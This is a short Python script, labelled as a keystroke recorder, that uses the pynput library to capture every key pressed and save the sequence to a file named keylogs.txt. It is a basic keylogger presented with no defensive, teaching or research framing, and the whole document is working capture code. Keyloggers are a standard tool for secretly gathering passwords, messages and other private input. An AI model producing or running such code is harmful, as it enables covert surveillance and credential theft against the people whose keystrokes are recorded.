# Python script to record keystrokes and upload them to a file named keylogs.txt

import pynput
from pynput.keyboard import Key, Listener

key_strokes = []

def on_press(key):
    try:
        key_strokes.append(str(key.char))
    except AttributeError:
        key_strokes.append(str(key))


listener = Listener(on_press=on_press)
listener.start()


def write_to_file():
    with open('keylogs.txt', 'w') as f:
        f.write(' '.join(key_strokes))


listener.join()
write_to_file()
